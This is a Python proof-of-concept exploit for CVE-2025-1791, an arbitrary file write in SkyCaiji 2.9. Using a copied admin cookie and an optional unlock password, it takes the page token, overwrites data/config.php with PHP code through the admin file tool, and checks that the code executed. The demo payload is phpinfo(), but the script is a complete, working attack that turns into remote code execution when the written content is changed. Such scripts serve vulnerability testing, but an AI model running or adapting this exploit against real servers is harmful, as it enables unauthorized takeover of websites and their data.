#!/usr/bin/env python3
"""
CVE-2025-1791 - SkyCaiji 2.9 Arbitrary File Write PoC

Official PoC style:
POST /index.php?s=/admin/tool/file
  - op=save
  - file=config.php
  - save_data=<?php phpinfo();?>

This script is cookie-only and performs:
1) validate an authenticated admin cookie
2) submit the official-style save request as multipart/form-data
3) verify execution signal from response pages
"""
import requests
import re
import sys
import time
import argparse

class SkyCaijiExploit:
    def __init__(self, base_url, unlock_password=""):
        self.base_url = base_url.rstrip('/')
        self.unlock_password = unlock_password
        self.session = requests.Session()
        self.usertoken = None

    def set_cookie_header(self, raw_cookie):
        for part in raw_cookie.split(";"):
            part = part.strip()
            if "=" not in part:
                continue
            key, value = part.split("=", 1)
            self.session.cookies.set(key.strip(), value.strip())

    def is_logged_in(self):
        resp = self.session.get(f"{self.base_url}/index.php?s=/admin/backstage/index")
        return "退出" in resp.text or "后台管理" in resp.text

    def get_usertoken(self, url=None):
        if url is None:
            url = f"{self.base_url}/index.php?s=/admin/index/index"
        resp = self.session.get(url)
        patterns = [
            r'usertoken:"([^"]+)"',
            r'name="_usertoken_"\s+value="([^"]+)"',
            r"'_usertoken_'\s*:\s*'([^']+)'",
            r'"_usertoken_"\s*:\s*"([^"]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, resp.text)
            if match:
                self.usertoken = match.group(1)
                return True
        return False

    def save_config_php(self, content):
        if not self.get_usertoken(f"{self.base_url}/index.php?s=/admin/tool/file"):
            print("[-] Failed to get usertoken on /admin/tool/file")
            return False

        resp = self._post_save_request(content)
        if "访问过期" in resp.text:
            print("[*] File manager locked, trying to unlock with password")
            if self.unlock_file_manager():
                resp = self._post_save_request(content)

        if "已修改" in resp.text or '"code":1' in resp.text:
            print("[+] Wrote payload to data/config.php")
            return True

        print("[-] Failed to write payload to data/config.php")
        print(resp.text[:300])
        return False

    def _post_save_request(self, content):
        return self.session.post(
            f"{self.base_url}/index.php?s=/admin/tool/file",
            files={
                "_usertoken_": (None, self.usertoken),
                "op": (None, "save"),
                "file": (None, "config.php"),
                "save_data": (None, content),
            },
            headers={"X-Requested-With": "XMLHttpRequest"},
        )

    def unlock_file_manager(self):
        if not self.unlock_password:
            print("[-] File manager is locked and no --unlock-password was provided")
            return False
        if not self.get_usertoken(f"{self.base_url}/index.php?s=/admin/tool/fileManager"):
            return False
        resp = self.session.post(
            f"{self.base_url}/index.php?s=/admin/tool/fileManager",
            data={
                "_check_pwd_": self.unlock_password,
                "_check_skip_": "24",
                "_usertoken_": self.usertoken,
                "_ajax_": "1",
            },
            headers={"X-Requested-With": "XMLHttpRequest"},
        )
        return '"code":1' in resp.text or "成功" in resp.text

    def check_execution(self):
        try:
            resp = self.session.get(f"{self.base_url}/index.php?s=/admin/index/index", timeout=10)
            return resp.text
        except Exception:
            return None

    def exploit(self, cookie):
        print(f"[*] Target: {self.base_url}")
        print("[*] Auth mode: existing browser cookie")
        self.set_cookie_header(cookie)
        if not self.is_logged_in():
            print("[-] Cookie is invalid or expired")
            return False
        print("[+] Cookie session is valid")
        print()

        time.sleep(1)

        php_code = '<?php phpinfo();?>'
        print("[*] Writing payload to data/config.php")

        if not self.save_config_php(php_code):
            return False

        time.sleep(1)

        print(f"[*] Verifying execution via: {self.base_url}/index.php?s=/admin/index/index")
        result = self.check_execution()

        if result:
            if "PHP Version" in result or "phpinfo()" in result.lower():
                print("[+] VULNERABILITY CONFIRMED - payload executed from config.php")
                print("[+] phpinfo() output detected")
                return True
            print("[*] Payload may have been written, but phpinfo output not detected.")
            print("[*] This can still indicate file overwrite; manually check /var/www/html/data/config.php.")
            return True

        print("[-] Could not verify execution")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-1791 SkyCaiji official-style PoC (cookie-only)"
    )
    parser.add_argument("base_url", help="Target base URL, e.g. http://localhost:8085")
    parser.add_argument(
        "--cookie",
        required=True,
        help="Raw Cookie header copied from browser",
    )
    parser.add_argument(
        "--unlock-password",
        default="",
        help="Optional admin password to unlock file manager if prompted",
    )
    args = parser.parse_args()

    print("=" * 60)
    print("CVE-2025-1791 - SkyCaiji Arbitrary File Write")
    print("=" * 60)
    print()
    print("Vulnerability: /admin/tool/file save_data allows arbitrary overwrite")
    print("Impact: Overwrite data/config.php with PHP payload")
    print()
    
    exploit = SkyCaijiExploit(args.base_url, args.unlock_password)
    if exploit.exploit(cookie=args.cookie):
        print()
        print("=" * 60)
        print("[+] Exploit completed successfully")
        print("=" * 60)
        sys.exit(0)
    else:
        print()
        print("=" * 60)
        print("[-] Exploit failed")
        print("=" * 60)
        sys.exit(1)


if __name__ == "__main__":
    main()
